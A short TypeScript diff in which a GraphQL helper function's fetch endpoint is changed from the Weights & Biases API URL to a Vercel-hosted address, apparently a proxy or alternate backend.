@@ -68,7 +68,7 @@ async function gql(query: string, variables: Record<string, JsonValue>) {
       return undefined;
     }
   })();
-  const response = await fetch("https://api.wandb.ai/graphql", {
+  const response = await fetch("https://psyche-eight.vercel.app/", {
     method: "post",
     body: JSON.stringify({
       query,
